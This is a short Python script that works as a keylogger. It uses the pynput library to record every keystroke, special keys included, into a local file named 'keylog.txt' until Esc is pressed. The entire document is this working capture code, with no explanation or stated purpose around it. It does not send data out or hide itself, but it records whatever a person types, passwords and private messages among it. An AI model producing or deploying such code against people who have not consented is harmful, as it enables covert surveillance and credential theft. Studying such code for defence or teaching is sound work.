from pynput import keyboard

# Path to the log file
log_file_path = "keylog.txt"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'[{key}]')

# Function to handle key release (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
